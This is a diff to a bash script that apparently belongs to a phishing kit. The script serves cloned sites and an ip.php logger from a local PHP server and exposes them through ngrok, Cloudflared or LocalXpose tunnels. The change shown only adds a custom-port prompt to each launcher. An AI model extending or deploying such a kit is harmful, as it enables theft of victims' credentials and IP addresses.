@@ -355,14 +355,38 @@ about() {
 
 ## Setup website and start php server
 HOST='127.0.0.1'
-PORT='8080'
+#DEFAULT PORT
+PORT='8080' 
 
+#COUSTOM PORT
+cusport() {
+	echo ""
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Coustom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
+	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
+		printf "\n\n"
+		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port 1024-9999 : ${WHITE}" CU_P
+		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
+			PORT=${CU_P}
+			echo ""
+		else
+			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
+                        { sleep 2; clear; banner; cusport; }
+		fi
+	elif [[ ${P_ANS} =~ ^([Nn])$ ]];then
+		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port : $PORT...${WHITE}"
+		echo ""
+	else 
+		echo ""
+                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...${WHITE}"
+		cusport
+	fi
+}
 setup_site() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+    	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
-	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
+	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
 ## Get IP address
@@ -407,6 +431,7 @@ capture_data() {
 
 ## Start ngrok
 start_ngrok() {
+	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -e "\n"
@@ -431,6 +456,7 @@ start_ngrok() {
 ## Start Cloudflared
 start_cloudflared() { 
     rm .cld.log > /dev/null 2>&1 &
+        cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
@@ -469,6 +495,7 @@ localxpose_auth() {
 
 ## Start LocalXpose (Again...)
 start_loclx() {
+	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
@@ -491,6 +518,7 @@ start_loclx() {
 
 ## Start localhost
 start_localhost() {
+	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
 	{ sleep 1; clear; banner_small; }
